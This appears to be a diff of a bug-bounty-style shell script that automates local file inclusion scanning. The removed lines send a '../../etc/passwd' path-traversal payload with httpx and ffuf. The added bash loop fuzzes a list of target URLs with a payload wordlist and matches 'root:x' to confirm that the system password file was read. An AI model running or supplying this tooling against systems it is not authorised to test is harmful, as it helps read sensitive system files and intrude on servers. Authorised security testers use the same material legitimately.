@@ -1,3 +1,8 @@
-echo 'https://domain/file.php?file=../../etc/passwd'|httpx -nc -t 250 -mr "root:x" -silent
-ffuf -mr 'root:x' -u http:/domain/file.php?file=FUZZ -w lfipayload.txt
-
+#!/bin/bash
+url=$1
+path=$2
+for i in $(cat $1);do echo "
+==========================================================
+URL: $i
+==========================================================
+">>ffuf_op.txt| ffuf -u $i/FUZZ -w $2 -mr "root:x" -t 60  ;done| tee -a ffuf_op.txt
